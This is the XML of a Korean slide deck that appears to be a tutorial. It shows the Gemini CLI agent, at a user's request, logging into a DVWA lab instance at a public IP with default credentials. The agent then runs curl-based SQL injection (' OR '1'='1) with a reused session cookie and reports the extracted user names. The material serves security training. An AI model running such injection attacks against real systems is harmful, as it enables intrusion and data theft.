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68" r:id="rId13"/>
  </p:sldMasterIdLst>
  <p:notesMasterIdLst>
    <p:notesMasterId r:id="rId17"/>
  </p:notesMasterIdLst>
  <p:handoutMasterIdLst>
    <p:handoutMasterId r:id="rId15"/>
  </p:handoutMasterIdLst>
  <p:sldIdLst>
    <p:sldId id="256" r:id="rId19"/>
    <p:sldId id="257" r:id="rId21"/>
    <p:sldId id="268" r:id="rId22"/>
    <p:sldId id="258" r:id="rId23"/>
    <p:sldId id="259" r:id="rId24"/>
    <p:sldId id="260" r:id="rId25"/>
    <p:sldId id="271" r:id="rId26"/>
    <p:sldId id="261" r:id="rId27"/>
    <p:sldId id="262" r:id="rId28"/>
    <p:sldId id="270" r:id="rId29"/>
    <p:sldId id="263" r:id="rId30"/>
    <p:sldId id="264" r:id="rId31"/>
    <p:sldId id="269" r:id="rId32"/>
    <p:sldId id="265" r:id="rId33"/>
    <p:sldId id="266" r:id="rId34"/>
    <p:sldId id="267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1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide2.xml"></Relationship><Relationship Id="rId22" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide3.xml"></Relationship><Relationship Id="rId23" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide4.xml"></Relationship><Relationship Id="rId24" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide5.xml"></Relationship><Relationship Id="rId25" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide6.xml"></Relationship><Relationship Id="rId26" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide7.xml"></Relationship><Relationship Id="rId27" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide8.xml"></Relationship><Relationship Id="rId28" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide9.xml"></Relationship><Relationship Id="rId29" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide10.xml"></Relationship><Relationship Id="rId30" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide11.xml"></Relationship><Relationship Id="rId31" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide12.xml"></Relationship><Relationship Id="rId32" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide13.xml"></Relationship><Relationship Id="rId33" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide14.xml"></Relationship><Relationship Id="rId34" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide15.xml"></Relationship><Relationship Id="rId35" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide16.xml"></Relationship><Relationship Id="rId36" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/viewProps" Target="viewProps.xml"></Relationship><Relationship Id="rId37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2396021345443.png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635" cy="2388235"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="91440" tIns="45720" rIns="91440" bIns="45720" numCol="1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 lang="ko-KR" altLang="en-US"/>
              <a:t>gemini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635" cy="165608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gemini 설치 및 실행</a:t>
            </a:r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325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metaverse@metaverseui-MacBookAir</a:t>
            </a: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~</a:t>
            </a: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%</a:t>
            </a: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sudo</a:t>
            </a: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npx</a:t>
            </a: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 </a:t>
            </a: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https://github.com/google-gemini/gemini-cli</a:t>
            </a:r>
            <a:endParaRPr lang="ko-KR" altLang="en-US" sz="36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Need to install the following packages:</a:t>
            </a:r>
            <a:endParaRPr lang="ko-KR" altLang="en-US" sz="36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github:google-gemini/gemini-cli</a:t>
            </a:r>
            <a:endParaRPr lang="ko-KR" altLang="en-US" sz="36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Ok to proceed? (y) y</a:t>
            </a:r>
            <a:endParaRPr lang="ko-KR" altLang="en-US" sz="36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ko-KR" altLang="en-US" sz="36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 ███            █████████  ██████████ ██████   ██████ █████ ██████   █████ █████</a:t>
            </a:r>
            <a:endParaRPr lang="ko-KR" altLang="en-US" sz="36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░░░███         ███░░░░░███░░███░░░░░█░░██████ ██████ ░░███ ░░██████ ░░███ ░░███</a:t>
            </a:r>
            <a:endParaRPr lang="ko-KR" altLang="en-US" sz="36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  ░░░███      ███     ░░░  ░███  █ ░  ░███░█████░███  ░███  ░███░███ ░███  ░███</a:t>
            </a:r>
            <a:endParaRPr lang="ko-KR" altLang="en-US" sz="36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    ░░░███   ░███          ░██████    ░███░░███ ░███  ░███  ░███░░███░███  ░███</a:t>
            </a:r>
            <a:endParaRPr lang="ko-KR" altLang="en-US" sz="36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     ███░    ░███    █████ ░███░░█    ░███ ░░░  ░███  ░███  ░███ ░░██████  ░███</a:t>
            </a:r>
            <a:endParaRPr lang="ko-KR" altLang="en-US" sz="36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   ███░      ░░███  ░░███  ░███ ░   █ ░███      ░███  ░███  ░███  ░░█████  ░███</a:t>
            </a:r>
            <a:endParaRPr lang="ko-KR" altLang="en-US" sz="36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 ███░         ░░█████████  ██████████ █████     █████ █████ █████  ░░█████ █████</a:t>
            </a:r>
            <a:endParaRPr lang="ko-KR" altLang="en-US" sz="36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░░░            ░░░░░░░░░  ░░░░░░░░░░ ░░░░░     ░░░░░ ░░░░░ ░░░░░    ░░░░░ ░░░░░</a:t>
            </a:r>
            <a:endParaRPr lang="ko-KR" altLang="en-US" sz="36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 sz="3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4400">
                <a:latin typeface="맑은 고딕" charset="0"/>
                <a:ea typeface="맑은 고딕" charset="0"/>
                <a:cs typeface="+mj-cs"/>
              </a:rPr>
              <a:t>gemini 설치 및 실행</a:t>
            </a:r>
            <a:endParaRPr lang="ko-KR" altLang="en-US" sz="440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85000" lnSpcReduction="0"/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="228600" indent="-228600" latinLnBrk="0">
              <a:buFont typeface="Arial"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:endParaRPr lang="ko-KR" altLang="en-US" sz="36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Tips for getting started:</a:t>
            </a:r>
            <a:endParaRPr lang="ko-KR" altLang="en-US" sz="36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1. Ask questions, edit files, or run commands.</a:t>
            </a:r>
            <a:endParaRPr lang="ko-KR" altLang="en-US" sz="36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2. Be specific for the best results.</a:t>
            </a:r>
            <a:endParaRPr lang="ko-KR" altLang="en-US" sz="36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3. Create GEMINI.md files to customize your interactions with Gemini.</a:t>
            </a:r>
            <a:endParaRPr lang="ko-KR" altLang="en-US" sz="36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3600">
                <a:latin typeface="맑은 고딕" charset="0"/>
                <a:ea typeface="맑은 고딕" charset="0"/>
                <a:cs typeface="+mn-cs"/>
              </a:rPr>
              <a:t>4. /help for more information.</a:t>
            </a:r>
            <a:endParaRPr lang="ko-KR" altLang="en-US" sz="36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ko-KR" altLang="en-US" sz="36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ko-KR" altLang="en-US" sz="36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점검 대상 접속</a:t>
            </a:r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700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╭──────────────────────────────────────────────────╮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│  &gt; http://129.154.211.208:8200/login.php 접속해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✔  WebFetch Processing URLs and instructions from prompt: "http://129.154.211.208:8200/login.php"                  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Content for http://129.154.211.208:8200/login.php processed using fallback fetch.                                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✦ It looks like that URL is for the Damn Vulnerable Web Application (DVWA). The default username is admin and the password is password. Would you like me to try logging in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with those credentials?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1차 접속(1)</a:t>
            </a:r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625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╭──────────────────────────────────────────╮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│  &gt; 로그인 하고, sql injection test 해줘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✔  WebFetch Processing URLs and instructions from prompt: "First, log in to http://129.154.211.208:8200/login.php with username 'admin' and password 'passwo..."    │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Content processed from prompt.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✦ I apologize, but I cannot directly interact with web pages to that extent. However, I can use command-line tools to simulate the login and test for SQL injection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vulnerabilities.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First, I will use curl to log in to the application and save the session cookie. This command will send a POST request with the provided credentials.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1차 접속(2)</a:t>
            </a:r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62500" lnSpcReduction="0"/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="228600" indent="-228600" latinLnBrk="0">
              <a:buFont typeface="Arial"/>
              <a:buChar char="•"/>
            </a:pP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✔  Shell curl -c cookies.txt -X POST -d "username=admin&amp;password=password&amp;Login=Login" http://129.154.211.208:8200/login.php (Log in to the DVWA application and save the s…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✦ Great, the login was successful. Now I will perform the SQL injection test using the session cookie. This command will send a request to the SQL injection page with a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payload designed to bypass the filtering and retrieve all data from the database.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✔  Shell curl -b cookies.txt "http://129.154.211.208:8200/vulnerabilities/sqli/?id=%27%20OR%20%271%27%3D%271&amp;Submit=Submit" (Perform the SQL injection test by sending a ma…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✦ The previous command didn't return any output, which is unusual. I'll try again, this time with the -i flag to include the HTTP response headers. This will give us more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information about what's happening.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4400">
                <a:latin typeface="맑은 고딕" charset="0"/>
                <a:ea typeface="맑은 고딕" charset="0"/>
                <a:cs typeface="+mj-cs"/>
              </a:rPr>
              <a:t>1차 접속(3)</a:t>
            </a:r>
            <a:endParaRPr lang="ko-KR" altLang="en-US" sz="440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775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│ ✔  Shell curl -i -b cookies.txt "http://129.154.211.208:8200/vulnerabilities/sqli/?id=%27%20OR%20%271%27%3D%271&amp;Submit=Submit" (Perform the SQL injection test again, this …  │     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HTTP/1.1 302 Found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Date: Fri, 15 Aug 2025 08:32:49 GMT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Server: Apache/2.4.25 (Debian)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Expires: Thu, 19 Nov 1981 08:52:00 GMT                                                                                    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/>
              <a:t>1차 접속(4)</a:t>
            </a:r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700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Cache-Control: no-store, no-cache, must-revalidate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Pragma: no-cache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Location: ../../login.php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Content-Length: 0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Content-Type: text/html; charset=UTF-8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✦ It seems the session is not being maintained correctly, as we are being redirected back to the login page. I'll try logging in again and then fetching the main page to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confirm that the session is established before attempting the SQL injection again.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First, I'll log in again and save the cookie.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/>
              <a:t>점검 프롬프트(1)</a:t>
            </a:r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700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│  &gt; vulnerabilities/sqli/?id=1' 경로를 이용해 sql injection test 해줘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✦ Understood. I will now attempt the SQL injection test on the path you provided, using the previously established session. I will include the response headers to get more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information.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✔  Shell curl -i -b cookies.txt "http://129.154.211.208:8200/vulnerabilities/sqli/?id=1%27" (Perform a SQL injection test on the specified path.)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HTTP/1.1 302 Found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Date: Fri, 15 Aug 2025 08:34:52 GMT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Server: Apache/2.4.25 (Debian)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Expires: Thu, 19 Nov 1981 08:52:00 GMT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4400">
                <a:latin typeface="맑은 고딕" charset="0"/>
                <a:ea typeface="맑은 고딕" charset="0"/>
                <a:cs typeface="+mj-cs"/>
              </a:rPr>
              <a:t>점검 프롬프트</a:t>
            </a:r>
            <a:endParaRPr lang="ko-KR" altLang="en-US" sz="440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70000" lnSpcReduction="0"/>
          </a:bodyPr>
          <a:lstStyle/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Cache-Control: no-store, no-cache, must-revalidate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Pragma: no-cache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Location: ../../login.php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Content-Length: 0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Content-Type: text/html; charset=UTF-8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✦ It appears we are still being redirected to the login page, which means the session is not being correctly established. This could be due to a hidden security token on the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login page.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I'll download the login page's HTML to inspect it for any hidden fields that we might need to include in our login request.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구체적인 점검 경로 입력</a:t>
            </a:r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625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│  &gt; admin/password로 로그인된 세션으로 vulnerabilities/sqli/?id=1 에 sql injection 테스트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✦ I understand. I will try again to perform the SQL injection test with a logged-in session. I will proceed with the login, and then I will attempt the SQL injection on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vulnerabilities/sqli/?id=1.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First, I will attempt to log in and save the session cookie.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✔  Shell curl -c cookies.txt -X POST -d "username=admin&amp;password=password&amp;Login=Login" http://129.154.211.208:8200/login.php (Log in to the DVWA application and save the s…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✦ Now that I have attempted to log in, I will try to access the SQL injection page with a valid user ID to see if the session is being maintained. I'm including the headers in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the output to get more details.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/>
              <a:t>세션 쿠키값을 입력하여 로그인 정보 전송(1)</a:t>
            </a:r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625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│  &gt; ehop3kr715rs5cpas78atdskk7 값을 PHPSESSID의 세션으로 이용해서 http://129.154.211.208:8200/vulnerabilities/sqli/?id=1 에 sql injection test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✦ Understood. I will now use the provided PHPSESSID to perform the SQL injection test on the specified URL. I will include a standard SQL injection payload and the response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headers.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✔  Shell curl -i --cookie "PHPSESSID=ehop3kr715rs5cpas78atdskk7" "http://129.154.211.208:8200/vulnerabilities/sqli/?id=1%27%20OR%20%271%27%3D%271&amp;Submit=Submit" (Perform a…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HTTP/1.1 302 Found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Date: Fri, 15 Aug 2025 08:39:11 GMT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Server: Apache/2.4.25 (Debian)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Expires: Thu, 19 Nov 1981 08:52:00 GMT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latinLnBrk="0">
              <a:buFontTx/>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US" sz="4400">
                <a:latin typeface="맑은 고딕" charset="0"/>
                <a:ea typeface="맑은 고딕" charset="0"/>
                <a:cs typeface="+mj-cs"/>
              </a:rPr>
              <a:t>세션 쿠키값을 입력하여 로그인 정보 전송(2)</a:t>
            </a:r>
            <a:endParaRPr lang="ko-KR" altLang="en-US" sz="440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400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Cache-Control: no-store, no-cache, must-revalidate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Pragma: no-cache  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Set-Cookie: PHPSESSID=ehop3kr715rs5cpas78atdskk7; path=/                                                                  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Set-Cookie: security=low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Location: index.php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Content-Length: 0 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Content-Type: text/html; charset=UTF-8                                                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✦ Excellent! The redirect to index.php indicates that the provided PHPSESSID is working and we have an active session. The security=low cookie also suggests the application is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in a vulnerable state.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Now, I will repeat the SQL injection attack, but this time I will use the -L flag to follow the redirect. This will allow us to see the content of the page after the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injection attempt, which should reveal if the attack was successful.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공격 코드가 입력된 요청 확인</a:t>
            </a:r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400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✔  Shell curl -L -i --cookie "PHPSESSID=ehop3kr715rs5cpas78atdskk7; security=low" "http://129.154.211.208:8200/vulnerabilities/sqli/?id=%27%20OR%20%271%27%3D%271&amp;Submit=Su…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HTTP/1.1 200 OK   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Date: Fri, 15 Aug 2025 08:44:27 GMT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Server: Apache/2.4.25 (Debian)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Expires: Tue, 23 Jun 2009 12:00:00 GMT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Cache-Control: no-cache, must-revalidate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Pragma: no-cache    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Vary: Accept-Encoding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Content-Length: 4821                 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│    Content-Type: text/html;charset=utf-8                                                                                                                                      │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gemini의 공격 결과 확인</a:t>
            </a:r>
            <a:endParaRPr lang="ko-KR" altLang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="내용 개체 틀 2"/>
          <p:cNvSpPr txBox="1">
            <a:spLocks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70000" lnSpcReduction="0"/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="228600" indent="-228600" latinLnBrk="0"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✦ Success! The SQL injection attack worked. The application is vulnerable to SQL injection on the id parameter.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As you can see in the response, we have successfully extracted the first names and surnames of all users from the database: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 * First name: admin, Surname: admin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 * First name: Gordon, Surname: Brown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 * First name: Hack, Surname: Me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 * First name: Pablo, Surname: Picasso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 * First name: Bob, Surname: Smith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rtl="0" algn="l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ko-KR" altLang="en-US" sz="2800">
                <a:latin typeface="맑은 고딕" charset="0"/>
                <a:ea typeface="맑은 고딕" charset="0"/>
                <a:cs typeface="+mn-cs"/>
              </a:rPr>
              <a:t>  This concludes the SQL injection test.</a:t>
            </a:r>
            <a:endParaRPr lang="ko-KR" altLang="en-US" sz="2800">
              <a:latin typeface="맑은 고딕" charset="0"/>
              <a:ea typeface="맑은 고딕" charset="0"/>
              <a:cs typeface="+mn-cs"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="228600" indent="-228600" latinLnBrk="0">
              <a:buFont typeface="Arial"/>
              <a:buChar char="•"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공격 코드가 포함된 요청을 웹브라우저에서 테스트</a:t>
            </a:r>
            <a:endParaRPr lang="ko-KR" altLang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="3" name="내용 개체 틀 2" descr="/Users/metaverse/Library/Group Containers/L48J367XN4.com.infraware.PolarisOffice/EngineTemp/1016/fImage2396021345443.png"/>
          <p:cNvPicPr>
            <a:picLocks noChangeAspect="1"/>
          </p:cNvPicPr>
          <p:nvPr>
            <p:ph type="obj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637790" y="1825625"/>
            <a:ext cx="6917055" cy="435165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16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po_user</dc:creator>
  <cp:lastModifiedBy>po_user</cp:lastModifiedBy>
  <dc:title>PowerPoint 프레젠테이션</dc:title>
</cp:coreProperties>
</file>